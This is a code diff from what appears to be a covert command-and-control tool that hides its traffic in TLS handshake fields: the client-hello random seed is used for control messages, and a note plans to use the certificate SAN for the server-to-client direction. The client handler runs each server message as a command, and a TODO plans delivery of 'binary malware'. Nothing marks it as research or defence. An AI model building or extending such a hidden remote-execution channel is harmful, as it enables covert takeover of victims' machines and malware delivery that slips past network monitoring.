@@ -4,6 +4,7 @@
     PROTOCOL:
 
     Use *TLS Random Seed Field* (32 bytes) for our 'Protocol Control Channel' - This is analogous to a TCP Segment Header
+    NOTE: We cannot use random seed field in the server -to-> client direction. Need to use SAN for that
 
     Length      Field
     ------------------------
@@ -43,6 +44,9 @@ class Message:
 
     def to_bytes(self):
         return self.header + self.body + self.padding
+
+    def hex(self) -> str:
+        return (self.header + self.body + self.padding).hex()
 
     def set(self, random_seed: bytes) -> None:
         self.header = random_seed[:4]
@@ -138,7 +142,7 @@ class API:
     def client_handle(self, request: bytes) -> bytes:
         # TODO: For now, we assume all messages from the server are string commands to exec
         # TODO: Need to extend this out to handle DATA INFILL (for delivering arbitrary payloads, like binary malware)
-        return self._run_command(request.decode())
+        return self._run_command(request)
 
     def server_handle(self, request: bytes) -> bytes:
         pass
